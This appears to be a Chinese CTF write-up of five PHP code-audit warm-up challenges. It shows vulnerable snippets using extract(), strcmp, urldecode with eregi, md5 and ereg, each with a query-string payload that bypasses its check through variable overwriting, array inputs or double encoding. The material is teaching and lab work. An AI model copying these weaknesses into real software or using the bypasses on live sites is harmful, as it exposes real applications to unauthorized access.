## 1.extract变量覆盖

```php
<?php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
$content=trim(file_get_contents($flag));
if($shiyan==$content)
{
echo'flag{xxx}';
}
else
{
echo'Oh.no';
}
}
?>
```

代码审计签到题

**payload:**

```
?shiyan=&flag=1
```

这里注意一下: `url` 上`shiyan` 是空，但是我们再代码中将其打印出来是 `var_dump($shiyan) => string(0) ""`。 



## 2.strcmp比较字符串

```php
<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
?>
```

还是签到题 :`strcmp` 弱比较问题

**payload：**

```
?a[]=1
```



## 3.urldecode二次编码绕过

```php
<?php
if(eregi("hackerDJ",$_GET[id])) {
echo("

not allowed!

");
exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
echo "
Access granted!

";
echo "
flag

";
}
?>
```

还是签到题，题目即答案。

直接在 url 上输入 urlencode 之后的数据，后端 php 代码获取到的是一次 url 解码之后的数据，所以对于一次 urldecode 需要两次 urlencode。



## 4.md5()函数

```php
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
if ($_GET['username'] == $_GET['password'])
print 'Your password can not be your username.';
else if (md5($_GET['username']) === md5($_GET['password']))
die('Flag: '.$flag);
else
print 'Invalid password';
}
?>
```

还是签到题

`PHP`对数组进行`hash`计算都会得出`null`的空值

**payload：**

```
?username[]=1&password[]=2
```



## 5.数组返回NULL绕过

```php
<?php
$flag = "flag";

if (isset ($_GET['password'])) {
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
echo 'You password must be alphanumeric';
else if (strpos ($_GET['password'], '--') !== FALSE)
die('Flag: ' . $flag);
else
echo 'Invalid password';
}
?>
```

**payload：**

```
?password[]=1
```

这里是数组的话，`ereg ("^[a-zA-Z0-9]+$", $_GET['password'])`  返回的是 `NULL`
